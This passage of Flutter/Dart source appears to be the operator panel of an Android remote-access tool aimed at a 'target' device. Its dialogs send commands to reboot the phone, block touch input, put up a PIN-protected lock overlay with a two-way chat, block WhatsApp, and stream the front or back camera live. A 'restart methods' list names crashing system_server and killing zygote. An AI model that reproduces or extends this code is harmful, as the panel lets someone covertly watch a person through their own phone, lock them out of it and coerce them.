                width: 40,
                decoration: BoxDecoration(
                  color: ControlTheme.silver.withOpacity(0.3),
                  borderRadius: BorderRadius.circular(2),
                ),
              ),
              
              // Header
              Container(
                padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 16),
                child: Row(
                  children: [
                    Container(
                      padding: const EdgeInsets.all(10),
                      decoration: BoxDecoration(
                        gradient: LinearGradient(
                          colors: [ControlTheme.gray1, ControlTheme.gray3],
                        ),
                        borderRadius: BorderRadius.circular(12),
                      ),
                      child: Icon(icon, color: Colors.white, size: 20),
                    ),
                    SizedBox(width: 12),
                    Expanded(
                      child: Text(
                        title,
                        style: TextStyle(
                          color: ControlTheme.textPrimary,
                          fontSize: 18,
                          fontWeight: FontWeight.bold,
                        ),
                      ),
                    ),
                    GestureDetector(
                      onTap: () => Navigator.pop(context),
                      child: Container(
                        padding: const EdgeInsets.all(8),
                        decoration: BoxDecoration(
                          color: ControlTheme.surface2,
                          shape: BoxShape.circle,
                        ),
                        child: Icon(
                          Icons.close_rounded,
                          color: ControlTheme.textMuted,
                          size: 20,
                        ),
                      ),
                    ),
                  ],
                ),
              ),
              
              // Divider
              Container(
                height: 0.5,
                margin: const EdgeInsets.symmetric(horizontal: 20),
                color: ControlTheme.silver.withOpacity(0.1),
              ),
              
              // Content
              Expanded(
                child: isScrollable
                    ? SingleChildScrollView(
                        controller: sc,
                        padding: const EdgeInsets.all(20),
                        child: child,
                      )
                    : Padding(
                        padding: const EdgeInsets.all(20),
                        child: child,
                      ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  // ─── CHAT SECTION ──────────────────────────────────────────────────────
  Widget _buildChatSection() {
    return Container(
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(
        color: ControlTheme.surface2,
        borderRadius: BorderRadius.circular(16),
        border: Border.all(
          color: ControlTheme.silver.withOpacity(0.1),
          width: 0.5,
        ),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              Icon(Icons.chat_rounded, color: ControlTheme.silver, size: 18),
              SizedBox(width: 10),
              Text(
                'CHAT WITH TARGET',
                style: TextStyle(
                  fontSize: 12,
                  fontWeight: FontWeight.bold,
                  color: ControlTheme.textPrimary,
                  letterSpacing: 1,
                ),
              ),
            ],
          ),
          SizedBox(height: 12),
          Container(
            height: 150,
            decoration: BoxDecoration(
              color: ControlTheme.cardDark,
              borderRadius: BorderRadius.circular(12),
              border: Border.all(
                color: ControlTheme.silver.withOpacity(0.05),
                width: 0.5,
              ),
            ),
            child: _chat.isEmpty
                ? Center(
                    child: Column(
                      mainAxisSize: MainAxisSize.min,
                      children: [
                        Icon(Icons.chat_bubble_outline, color: ControlTheme.textMuted, size: 32),
                        SizedBox(height: 8),
                        Text(
                          'No messages yet',
                          style: TextStyle(color: ControlTheme.textMuted, fontSize: 11),
                        ),
                      ],
                    ),
                  )
                : ListView.builder(
                    controller: _chatScroll,
                    padding: const EdgeInsets.all(10),
                    itemCount: _chat.length,
                    itemBuilder: (_, i) {
                      final m = _chat[i];
                      final isOwner = m['from'] == 'owner';
                      return Align(
                        alignment: isOwner ? Alignment.centerRight : Alignment.centerLeft,
                        child: Container(
                          margin: const EdgeInsets.symmetric(vertical: 3),
                          padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 10),
                          constraints: BoxConstraints(
                            maxWidth: MediaQuery.of(context).size.width * 0.6,
                          ),
                          decoration: BoxDecoration(
                            gradient: isOwner
                                ? LinearGradient(
                                    colors: [ControlTheme.gray1, ControlTheme.gray3],
                                  )
                                : null,
                            color: isOwner ? null : ControlTheme.surface2,
                            borderRadius: BorderRadius.circular(16),
                            border: isOwner
                                ? null
                                : Border.all(
                                    color: ControlTheme.silver.withOpacity(0.1),
                                    width: 0.5,
                                  ),
                          ),
                          child: Column(
                            crossAxisAlignment: isOwner ? CrossAxisAlignment.end : CrossAxisAlignment.start,
                            children: [
                              Text(
                                m['text'] ?? '',
                                style: TextStyle(
                                  color: ControlTheme.textPrimary,
                                  fontSize: 12,
                                ),
                              ),
                              SizedBox(height: 4),
                              Text(
                                m['time'] ?? '',
                                style: TextStyle(
                                  color: ControlTheme.textMuted,
                                  fontSize: 8,
                                ),
                              ),
                            ],
                          ),
                        ),
                      );
                    },
                  ),
          ),
          SizedBox(height: 12),
          Row(
            children: [
              Expanded(
                child: Container(
                  decoration: BoxDecoration(
                    color: ControlTheme.cardDark,
                    borderRadius: BorderRadius.circular(24),
                    border: Border.all(
                      color: ControlTheme.silver.withOpacity(0.1),
                      width: 0.5,
                    ),
                  ),
                  child: TextField(
                    controller: _chatCtrl,
                    style: TextStyle(
                      color: ControlTheme.textPrimary,
                      fontSize: 12,
                    ),
                    decoration: InputDecoration(
                      hintText: 'Type message...',
                      hintStyle: TextStyle(
                        color: ControlTheme.textMuted,
                        fontSize: 11,
                      ),
                      contentPadding: const EdgeInsets.symmetric(
                        horizontal: 16,
                        vertical: 12,
                      ),
                      border: InputBorder.none,
                    ),
                    onSubmitted: _sendChat,
                  ),
                ),
              ),
              SizedBox(width: 10),
              GestureDetector(
                onTap: () => _sendChat(_chatCtrl.text),
                child: Container(
                  padding: const EdgeInsets.all(14),
                  decoration: BoxDecoration(
                    gradient: LinearGradient(
                      colors: [ControlTheme.gray1, ControlTheme.gray3],
                    ),
                    shape: BoxShape.circle,
                    border: Border.all(
                      color: ControlTheme.silver.withOpacity(0.2),
                      width: 0.5,
                    ),
                  ),
                  child: Icon(
                    Icons.send_rounded,
                    color: Colors.white,
                    size: 18,
                  ),
                ),
              ),
            ],
          ),
        ],
      ),
    );
  }

  // ─── RESTART METHODS ───────────────────────────────────────────────────
  Widget _buildRestartMethods() {
    return Container(
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(
        color: ControlTheme.surface2,
        borderRadius: BorderRadius.circular(16),
        border: Border.all(
          color: ControlTheme.silver.withOpacity(0.1),
          width: 0.5,
        ),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Text(
            'RESTART METHODS',
            style: TextStyle(
              fontSize: 11,
              fontWeight: FontWeight.w600,
              color: ControlTheme.textPrimary,
              letterSpacing: 1,
            ),
          ),
          SizedBox(height: 12),
          _infoRow('1', 'PowerManager reflection (no root required)'),
          _infoRow('2', 'DevicePolicyManager (if admin active)'),
          _infoRow('3', 'su -c reboot (root)'),
          _infoRow('4', 'am crash system_server'),
          _infoRow('5', 'pkill -9 zygote'),
        ],
      ),
    );
  }

  void _showRestartDialog() {
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: ControlTheme.surface,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(20),
          side: BorderSide(color: ControlTheme.silver.withOpacity(0.2)),
        ),
        title: Row(
          children: [
            Icon(Icons.restart_alt_rounded, color: ControlTheme.silver, size: 24),
            SizedBox(width: 10),
            Text(
              'Restart Device',
              style: TextStyle(
                color: ControlTheme.textPrimary,
                fontSize: 16,
                fontWeight: FontWeight.bold,
              ),
            ),
          ],
        ),
        content: Text(
          'Target device will restart.\n\nUsing PowerManager reflection — no root or device admin required.',
          style: TextStyle(
            color: ControlTheme.textSec,
            fontSize: 12,
            height: 1.5,
          ),
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: Text(
              'Cancel',
              style: TextStyle(color: ControlTheme.textMuted, fontSize: 12),
            ),
          ),
          ElevatedButton(
            style: ElevatedButton.styleFrom(
              backgroundColor: ControlTheme.error,
              shape: RoundedRectangleBorder(
                borderRadius: BorderRadius.circular(12),
              ),
              padding: const EdgeInsets.symmetric(horizontal: 24, vertical: 12),
            ),
            onPressed: () {
              Navigator.pop(context);
              _cmd('reboot_device');
            },
            child: const Text(
              'Restart',
              style: TextStyle(
                color: Colors.white,
                fontSize: 12,
                fontWeight: FontWeight.bold,
              ),
            ),
          ),
        ],
      ),
    );
  }

  // ─── SWITCH DIALOGS ──────────────────────────────────────────────────
  void _showTorchDialog() {
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: ControlTheme.surface,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(20),
          side: BorderSide(color: ControlTheme.silver.withOpacity(0.2)),
        ),
        title: Row(
          children: [
            Icon(Icons.flashlight_on_rounded, color: ControlTheme.silver, size: 24),
            SizedBox(width: 10),
            Text(
              'Torch',
              style: TextStyle(
                color: ControlTheme.textPrimary,
                fontSize: 16,
                fontWeight: FontWeight.bold,
              ),
            ),
          ],
        ),
        content: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            Container(
              padding: const EdgeInsets.all(16),
              decoration: BoxDecoration(
                color: ControlTheme.cardDark,
                borderRadius: BorderRadius.circular(12),
                border: Border.all(
                  color: ControlTheme.silver.withOpacity(0.1),
                ),
              ),
              child: Row(
                mainAxisAlignment: MainAxisAlignment.spaceBetween,
                children: [
                  Text(
                    'Torch Status',
                    style: TextStyle(
                      color: ControlTheme.textSec,
                      fontSize: 13,
                    ),
                  ),
                  Switch(
                    value: _torchOn,
                    onChanged: (val) {
                      setState(() => _torchOn = val);
                      _cmd(val ? 'torch_on' : 'torch_off');
                    },
                    activeColor: ControlTheme.silver,
                    inactiveThumbColor: ControlTheme.gray3,
                  ),
                ],
              ),
            ),
          ],
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: Text(
              'Close',
              style: TextStyle(color: ControlTheme.textMuted, fontSize: 12),
            ),
          ),
        ],
      ),
    );
  }

  void _showStrobeDialog() {
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: ControlTheme.surface,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(20),
          side: BorderSide(color: ControlTheme.silver.withOpacity(0.2)),
        ),
        title: Row(
          children: [
            Icon(Icons.flash_on_rounded, color: ControlTheme.silver, size: 24),
            SizedBox(width: 10),
            Text(
              'Strobe',
              style: TextStyle(
                color: ControlTheme.textPrimary,
                fontSize: 16,
                fontWeight: FontWeight.bold,
              ),
            ),
          ],
        ),
        content: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            Container(
              padding: const EdgeInsets.all(16),
              decoration: BoxDecoration(
                color: ControlTheme.cardDark,
                borderRadius: BorderRadius.circular(12),
                border: Border.all(
                  color: ControlTheme.silver.withOpacity(0.1),
                ),
              ),
              child: Row(
                mainAxisAlignment: MainAxisAlignment.spaceBetween,
                children: [
                  Text(
                    'Strobe Status',
                    style: TextStyle(
                      color: ControlTheme.textSec,
                      fontSize: 13,
                    ),
                  ),
                  Switch(
                    value: _strobeOn,
                    onChanged: (val) {
                      setState(() => _strobeOn = val);
                      _cmd(val ? 'flash_strobe' : 'stop_strobe');
                    },
                    activeColor: ControlTheme.silver,
                    inactiveThumbColor: ControlTheme.gray3,
                  ),
                ],
              ),
            ),
          ],
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: Text(
              'Close',
              style: TextStyle(color: ControlTheme.textMuted, fontSize: 12),
            ),
          ),
        ],
      ),
    );
  }

  // ─── TOUCH BLOCK ──────────────────────────────────────────────────────
  void _showTouchBlockDialog() {
    final ctrl = TextEditingController();
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: ControlTheme.surface,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(20),
          side: BorderSide(color: ControlTheme.silver.withOpacity(0.2)),
        ),
        title: Row(
          children: [
            Icon(Icons.touch_app_rounded, color: ControlTheme.error, size: 24),
            SizedBox(width: 10),
            Text(
              'Touch Block',
              style: TextStyle(
                color: ControlTheme.textPrimary,
                fontSize: 16,
                fontWeight: FontWeight.bold,
              ),
            ),
          ],
        ),
        content: Column(
          mainAxisSize: MainAxisSize.min,
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Text(
              'Set duration for touch block in seconds',
              style: TextStyle(color: ControlTheme.textSec, fontSize: 12),
            ),
            SizedBox(height: 16),
            _field(ctrl, 'Duration (seconds)', hint: '10', isNum: true),
          ],
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: Text(
              'Cancel',
              style: TextStyle(color: ControlTheme.textMuted, fontSize: 12),
            ),
          ),
          ElevatedButton(
            style: ElevatedButton.styleFrom(
              backgroundColor: ControlTheme.error,
              shape: RoundedRectangleBorder(
                borderRadius: BorderRadius.circular(12),
              ),
              padding: const EdgeInsets.symmetric(horizontal: 24, vertical: 12),
            ),
            onPressed: () {
              Navigator.pop(context);
              final dur = ctrl.text.trim().isEmpty ? '10' : ctrl.text.trim();
              _cmd('touch_block', extra: dur);
            },
            child: const Text(
              'Block Touch',
              style: TextStyle(
                color: Colors.white,
                fontSize: 12,
                fontWeight: FontWeight.bold,
              ),
            ),
          ),
        ],
      ),
    );
  }

  // ─── OVERLAY LOCK ──────────────────────────────────────────────────────
  void _showOverlayLockDialog() {
    final ctrl = TextEditingController();
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: ControlTheme.surface,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(20),
          side: BorderSide(color: ControlTheme.silver.withOpacity(0.2)),
        ),
        title: Row(
          children: [
            Icon(Icons.layers_rounded, color: ControlTheme.gray3, size: 24),
            SizedBox(width: 10),
            Text(
              'Overlay Lock',
              style: TextStyle(
                color: ControlTheme.textPrimary,
                fontSize: 16,
                fontWeight: FontWeight.bold,
              ),
            ),
          ],
        ),
        content: Column(
          mainAxisSize: MainAxisSize.min,
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Text(
              'Set password/pin for overlay lock',
              style: TextStyle(color: ControlTheme.textSec, fontSize: 12),
            ),
            SizedBox(height: 16),
            _field(ctrl, 'Password Overlay', hint: 'Enter password/pin'),
          ],
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: Text(
              'Cancel',
              style: TextStyle(color: ControlTheme.textMuted, fontSize: 12),
            ),
          ),
          ElevatedButton(
            style: ElevatedButton.styleFrom(
              backgroundColor: ControlTheme.gray3,
              shape: RoundedRectangleBorder(
                borderRadius: BorderRadius.circular(12),
              ),
              padding: const EdgeInsets.symmetric(horizontal: 24, vertical: 12),
            ),
            onPressed: () {
              Navigator.pop(context);
              final pass = ctrl.text.trim().isEmpty ? '1234' : ctrl.text.trim();
              _cmd('overlay_lock', extra: pass);
            },
            child: const Text(
              'Lock Overlay',
              style: TextStyle(
                color: Colors.white,
                fontSize: 12,
                fontWeight: FontWeight.bold,
              ),
            ),
          ),
        ],
      ),
    );
  }

  // ─── LOCK LIVE DIALOG ────────────────────────────────────────────────
  void _lockLiveDialog() {
    final msgCtrl = TextEditingController();
    final pinCtrl = TextEditingController();
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: ControlTheme.surface,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(20),
          side: BorderSide(color: ControlTheme.silver.withOpacity(0.2)),
        ),
        title: Row(
          children: [
            Icon(Icons.lock_rounded, color: ControlTheme.error, size: 24),
            SizedBox(width: 10),
            Text(
              'Lock Live + Chat',
              style: TextStyle(
                color: ControlTheme.error,
                fontSize: 16,
                fontWeight: FontWeight.bold,
              ),
            ),
          ],
        ),
        content: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            Text(
              'Target locked + two-way chat',
              style: TextStyle(color: ControlTheme.textSec, fontSize: 12),
            ),
            SizedBox(height: 16),
            _field(msgCtrl, 'Lock screen message', hint: 'This device is locked by administrator'),
            SizedBox(height: 12),
            _field(pinCtrl, 'Unlock PIN', hint: '1234', isNum: true),
          ],
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: Text(
              'Cancel',
              style: TextStyle(color: ControlTheme.textMuted, fontSize: 12),
            ),
          ),
          ElevatedButton(
            style: ElevatedButton.styleFrom(
              backgroundColor: ControlTheme.error,
              shape: RoundedRectangleBorder(
                borderRadius: BorderRadius.circular(12),
              ),
              padding: const EdgeInsets.symmetric(horizontal: 24, vertical: 12),
            ),
            onPressed: () {
              Navigator.pop(context);
              final msg = msgCtrl.text.trim().isEmpty ? 'DEVICE LOCKED BY ADMINISTRATOR' : msgCtrl.text.trim();
              final pin = pinCtrl.text.trim().isEmpty ? '1234' : pinCtrl.text.trim();
              _cmd('lock_live', extra: '$msg|$pin');
            },
            child: const Text(
              'LOCK LIVE',
              style: TextStyle(
                color: Colors.white,
                fontSize: 12,
                fontWeight: FontWeight.bold,
              ),
            ),
          ),
        ],
      ),
    );
  }

  // ─── APP BLOCK ──────────────────────────────────────────────────────
  void _showAppBlockSheet() {
    showModalBottomSheet(
      context: context,
      backgroundColor: ControlTheme.surface,
      isScrollControlled: true,
      shape: const RoundedRectangleBorder(
        borderRadius: BorderRadius.vertical(top: Radius.circular(24)),
      ),
      builder: (_) => DraggableScrollableSheet(
        initialChildSize: 0.4,
        maxChildSize: 0.6,
        expand: false,
        builder: (_, sc) => Column(
          children: [
            Container(
              height: 4,
              width: 40,
              margin: const EdgeInsets.only(top: 12, bottom: 8),
              decoration: BoxDecoration(
                color: ControlTheme.silver.withOpacity(0.3),
                borderRadius: BorderRadius.circular(2),
              ),
            ),
            Container(
              padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 12),
              child: Row(
                children: [
                  Icon(Icons.block_rounded, color: ControlTheme.silver, size: 24),
                  SizedBox(width: 10),
                  Text(
                    'App Blocked',
                    style: TextStyle(
                      color: ControlTheme.textPrimary,
                      fontSize: 18,
                      fontWeight: FontWeight.bold,
                    ),
                  ),
                ],
              ),
            ),
            SizedBox(height: 8),
            Expanded(
              child: ListView(
                controller: sc,
                padding: const EdgeInsets.symmetric(horizontal: 16),
                children: [
                  _buildAppBlockItem(
                    'WhatsApp',
                    'com.whatsapp',
                    Icons.chat_bubble_outline,
                    _whatsappBlocked,
                    () {
                      setState(() {
                        _whatsappBlocked = !_whatsappBlocked;
                      });
                      _cmd(_whatsappBlocked ? 'block_app' : 'unblock_app', extra: 'com.whatsapp');
                    },
                  ),
                ],
              ),
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildAppBlockItem(String name, String package, IconData icon, bool isBlocked, VoidCallback onTap) {
    return Container(
      margin: const EdgeInsets.symmetric(vertical: 6),
      padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 14),
      decoration: BoxDecoration(
        color: ControlTheme.cardDark,
        borderRadius: BorderRadius.circular(16),
        border: Border.all(
          color: isBlocked ? ControlTheme.error.withOpacity(0.5) : ControlTheme.silver.withOpacity(0.1),
        ),
      ),
      child: Row(
        children: [
          Container(
            width: 48,
            height: 48,
            decoration: BoxDecoration(
              color: ControlTheme.surface2,
              borderRadius: BorderRadius.circular(12),
            ),
            child: Icon(icon, color: ControlTheme.silver, size: 28),
          ),
          SizedBox(width: 14),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(
                  name,
                  style: TextStyle(
                    color: ControlTheme.textPrimary,
                    fontSize: 14,
                    fontWeight: FontWeight.w600,
                  ),
                ),
                Text(
                  package,
                  style: TextStyle(
                    color: ControlTheme.textMuted,
                    fontSize: 10,
                  ),
                ),
              ],
            ),
          ),
          GestureDetector(
            onTap: onTap,
            child: Container(
              padding: const EdgeInsets.symmetric(horizontal: 18, vertical: 10),
              decoration: BoxDecoration(
                color: isBlocked ? ControlTheme.success : ControlTheme.error,
                borderRadius: BorderRadius.circular(12),
              ),
              child: Text(
                isBlocked ? 'Unblock' : 'Block',
                style: TextStyle(
                  color: Colors.white,
                  fontSize: 12,
                  fontWeight: FontWeight.bold,
                ),
              ),
            ),
          ),
        ],
      ),
    );
  }

  // ─── CAMERA PICKER ────────────────────────────────────────────────────
  void _showCamPicker(Function(String) onPick) {
    String sel = 'back';
    showDialog(
      context: context,
      builder: (_) => StatefulBuilder(
        builder: (ctx, ss) => AlertDialog(
          backgroundColor: ControlTheme.surface,
          shape: RoundedRectangleBorder(
            borderRadius: BorderRadius.circular(20),
            side: BorderSide(color: ControlTheme.silver.withOpacity(0.2)),
          ),
          title: Row(
            children: [
              Icon(Icons.camera_alt_rounded, color: ControlTheme.silver, size: 24),
              SizedBox(width: 10),
              Text(
                'Select Camera',
                style: TextStyle(
                  color: ControlTheme.textPrimary,
                  fontSize: 16,
                  fontWeight: FontWeight.bold,
                ),
              ),
            ],
          ),
          content: Row(
            mainAxisAlignment: MainAxisAlignment.spaceEvenly,
            children: ['back', 'front'].map((v) {
              final isSel = sel == v;
              return GestureDetector(
                onTap: () => ss(() => sel = v),
                child: AnimatedContainer(
                  duration: const Duration(milliseconds: 200),
                  padding: const EdgeInsets.symmetric(horizontal: 28, vertical: 18),
                  decoration: BoxDecoration(
                    color: isSel ? ControlTheme.gray1.withOpacity(0.15) : Colors.transparent,
                    borderRadius: BorderRadius.circular(16),
                    border: Border.all(
                      color: isSel ? ControlTheme.silver : ControlTheme.surface3,
                      width: isSel ? 2 : 1,
                    ),
                  ),
                  child: Column(
                    children: [
                      Icon(
                        v == 'back' ? Icons.camera_rear_rounded : Icons.camera_front_rounded,
                        color: isSel ? ControlTheme.silver : ControlTheme.textMuted,
                        size: 36,
                      ),
                      SizedBox(height: 8),
                      Text(
                        v == 'back' ? 'Back' : 'Front',
                        style: TextStyle(
                          color: isSel ? ControlTheme.silver : ControlTheme.textMuted,
                          fontSize: 11,
                          fontWeight: FontWeight.w600,
                        ),
                      ),
                    ],
                  ),
                ),
              );
            }).toList(),
          ),
          actions: [
            TextButton(
              onPressed: () => Navigator.pop(ctx),
              child: Text(
                'Cancel',
                style: TextStyle(color: ControlTheme.textMuted, fontSize: 12),
              ),
            ),
            ElevatedButton(
              style: ElevatedButton.styleFrom(
                backgroundColor: ControlTheme.gray1,
                shape: RoundedRectangleBorder(
                  borderRadius: BorderRadius.circular(12),
                ),
                padding: const EdgeInsets.symmetric(horizontal: 24, vertical: 12),
              ),
              onPressed: () {
                Navigator.pop(ctx);
                onPick(sel);
              },
              child: const Text(
                'Select',
                style: TextStyle(
                  color: Colors.white,
                  fontSize: 12,
                  fontWeight: FontWeight.bold,
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }

  // ─── INPUT DIALOG ──────────────────────────────────────────────────────
  void _inputDialog(String title, String label, Function(String) onDone, {bool isNumber = false, String hint = ''}) {
    final ctrl = TextEditingController();
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: ControlTheme.surface,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(20),
          side: BorderSide(color: ControlTheme.silver.withOpacity(0.2)),
        ),
        title: Text(
          title,
          style: TextStyle(
            color: ControlTheme.textPrimary,
            fontSize: 16,
            fontWeight: FontWeight.bold,
          ),
        ),
        content: _field(ctrl, label, hint: hint, isNum: isNumber),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: Text(
              'Cancel',
              style: TextStyle(color: ControlTheme.textMuted, fontSize: 12),
            ),
          ),
          ElevatedButton(
            style: ElevatedButton.styleFrom(
              backgroundColor: ControlTheme.gray1,
              shape: RoundedRectangleBorder(
                borderRadius: BorderRadius.circular(12),
              ),
              padding: const EdgeInsets.symmetric(horizontal: 24, vertical: 12),
            ),
            onPressed: () {
              Navigator.pop(context);
              onDone(ctrl.text.trim());
            },
            child: const Text(
              'Send',
              style: TextStyle(
                color: Colors.white,
                fontSize: 12,
                fontWeight: FontWeight.bold,
              ),
            ),
          ),
        ],
      ),
    );
  }

  // ─── LIVE DIALOG ──────────────────────────────────────────────────────
  void _showLiveDialog() {
    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (_) => ValueListenableBuilder<int>(
        valueListenable: _frameN,
        builder: (ctx, _, __) => Dialog(
          backgroundColor: ControlTheme.surface,
          insetPadding: const EdgeInsets.all(8),
          shape: RoundedRectangleBorder(
            borderRadius: BorderRadius.circular(24),
            side: BorderSide(color: ControlTheme.silver.withOpacity(0.2)),
          ),
          child: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              // Header
              Container(
                padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 12),
                decoration: BoxDecoration(
                  color: ControlTheme.surface2,
                  borderRadius: const BorderRadius.vertical(top: Radius.circular(24)),
                  border: Border(
                    bottom: BorderSide(
                      color: ControlTheme.silver.withOpacity(0.1),
                    ),
                  ),
                ),
                child: Row(
                  children: [
                    Container(
                      width: 10,
                      height: 10,
                      decoration: const BoxDecoration(
                        color: ControlTheme.error,
                        shape: BoxShape.circle,
                      ),
                    ),
                    SizedBox(width: 10),
                    Text(
                      'LIVE — $_liveTitle',
                      style: TextStyle(
                        fontSize: 13,
                        fontWeight: FontWeight.bold,
                        color: ControlTheme.textPrimary,
                      ),
                    ),
                    const Spacer(),
                    Container(
                      padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 4),
                      decoration: BoxDecoration(
                        color: ControlTheme.success.withOpacity(0.15),
                        borderRadius: BorderRadius.circular(8),
                        border: Border.all(
                          color: ControlTheme.success.withOpacity(0.4),
                        ),
                      ),
                      child: Text(
                        '$_fps fps',
                        style: TextStyle(
                          fontSize: 9,
                          fontWeight: FontWeight.bold,
                          color: ControlTheme.success,
                        ),
                      ),
                    ),
                  ],
                ),
              ),
              
              // Frame
              Container(
                constraints: BoxConstraints(
                  maxHeight: MediaQuery.of(context).size.height * 0.5,
                ),
                color: ControlTheme.cardDark,
                child: _frame != null
                    ? Image.memory(
                        _frame!,
                        fit: BoxFit.contain,
                        gaplessPlayback: true,
                        filterQuality: FilterQuality.low,
                      )
                    : SizedBox(
                        height: 200,
                        child: Center(
                          child: Column(
                            mainAxisSize: MainAxisSize.min,
                            children: [
                              CircularProgressIndicator(
                                color: ControlTheme.gray1,
                                strokeWidth: 2,
                              ),
                              SizedBox(height: 12),
                              Text(
                                'Waiting for frames...',
                                style: TextStyle(
                                  color: ControlTheme.textMuted,
                                  fontSize: 11,
                                ),
                              ),
                            ],
                          ),
                        ),
                      ),
              ),
              
              // Actions
              Container(
                padding: const EdgeInsets.all(12),
                decoration: BoxDecoration(
                  color: ControlTheme.surface2,
                  borderRadius: const BorderRadius.vertical(bottom: Radius.circular(24)),
                  border: Border(
                    top: BorderSide(
                      color: ControlTheme.silver.withOpacity(0.1),
                    ),
                  ),
                ),
                child: Row(
                  children: [
                    Expanded(
                      child: OutlinedButton.icon(
                        style: OutlinedButton.styleFrom(
                          side: BorderSide(
                            color: ControlTheme.silver.withOpacity(0.2),
                          ),
                          shape: RoundedRectangleBorder(
                            borderRadius: BorderRadius.circular(12),
                          ),
                          padding: const EdgeInsets.symmetric(vertical: 12),
                        ),
                        icon: Icon(
                          Icons.cameraswitch_rounded,
                          color: ControlTheme.textMuted,
                          size: 18,
                        ),
                        label: Text(
                          'Switch',
                          style: TextStyle(
                            color: ControlTheme.textMuted,
                            fontSize: 11,
                          ),
                        ),
                        onPressed: () {
                          final isFront = _liveTitle.contains('DEPAN');
                          _stopLive();
                          Future.delayed(
                            const Duration(milliseconds: 300),
                            () => _startLive(
                              'live_camera_start',
                              isFront ? 'back' : 'front',
                            ),
                          );
                        },
                      ),
                    ),
                    SizedBox(width: 10),
                    Expanded(
                      child: ElevatedButton.icon(
                        style: ElevatedButton.styleFrom(
                          backgroundColor: ControlTheme.error,
                          shape: RoundedRectangleBorder(
                            borderRadius: BorderRadius.circular(12),
                          ),
                          padding: const EdgeInsets.symmetric(vertical: 12),
                        ),
                        icon: Icon(
                          Icons.stop_rounded,
                          color: Colors.white,
                          size: 18,
                        ),
                        label: const Text(
                          'Stop',
                          style: TextStyle(
                            color: Colors.white,
                            fontSize: 12,
                            fontWeight: FontWeight.bold,
                          ),
                        ),
                        onPressed: () {
                          _stopLive();
                          Navigator.pop(ctx);
                        },
                      ),
                    ),
                  ],
                ),
              ),
            ],
          ),
        ),
      ),
    ).then((_) => _stopLive());
  }

  // ─── FILE MANAGER ──────────────────────────────────────────────────────
  void _showFileManager() {
    _addLog('Opening File Manager...');
    showModalBottomSheet(
      context: context,
      backgroundColor: Colors.transparent,
      isScrollControlled: true,
      shape: const RoundedRectangleBorder(
        borderRadius: BorderRadius.vertical(top: Radius.circular(24)),
      ),
      builder: (_) => Container(
        decoration: BoxDecoration(
          color: ControlTheme.surface,
          borderRadius: const BorderRadius.vertical(top: Radius.circular(24)),
          border: Border(
            top: BorderSide(
              color: ControlTheme.silver.withOpacity(0.1),
              width: 0.5,
            ),
          ),
        ),
        child: DraggableScrollableSheet(
          initialChildSize: 0.7,
          maxChildSize: 0.95,
          minChildSize: 0.3,
          expand: false,
          builder: (_, sc) => Column(
            children: [
              Container(
                margin: const EdgeInsets.only(top: 12),
                height: 4,
                width: 40,
                decoration: BoxDecoration(
                  color: ControlTheme.silver.withOpacity(0.3),
                  borderRadius: BorderRadius.circular(2),
                ),
              ),
              Container(
                padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 16),
                child: Row(
                  children: [
                    Container(
                      padding: const EdgeInsets.all(10),
                      decoration: BoxDecoration(
                        gradient: LinearGradient(
                          colors: [ControlTheme.gray1, ControlTheme.gray3],
                        ),
                        borderRadius: BorderRadius.circular(12),
                      ),
                      child: Icon(
                        Icons.folder_rounded,
                        color: Colors.white,
                        size: 20,
                      ),
                    ),
                    SizedBox(width: 12),
                    Expanded(
                      child: Text(
                        'File Manager',
                        style: TextStyle(
                          color: ControlTheme.textPrimary,
                          fontSize: 18,
                          fontWeight: FontWeight.bold,
                        ),
                      ),
                    ),
                    GestureDetector(
                      onTap: () => Navigator.pop(context),
                      child: Container(
                        padding: const EdgeInsets.all(8),
                        decoration: BoxDecoration(
                          color: ControlTheme.surface2,
                          shape: BoxShape.circle,
                        ),
                        child: Icon(
                          Icons.close_rounded,
                          color: ControlTheme.textMuted,
                          size: 20,
